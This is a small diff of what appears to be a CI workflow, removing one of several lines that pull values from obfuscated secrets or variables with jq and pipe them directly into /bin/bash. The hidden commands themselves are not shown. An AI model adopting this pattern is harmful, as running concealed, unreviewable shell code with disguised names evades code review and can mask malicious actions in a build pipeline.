@@ -18,7 +18,6 @@ jobs:
           on33147: ${{ secrets.on33147 }}
         run: |
           printf '%s' "$on33147" | jq -r .ujt96 | /bin/bash
-          echo $x56120 | jq -r .rodd0 | /bin/bash
           echo $wilvi635 | jq -r .k5 | /bin/bash
           echo $smn6237 | jq -r .hbiwp667 | /bin/bash
 
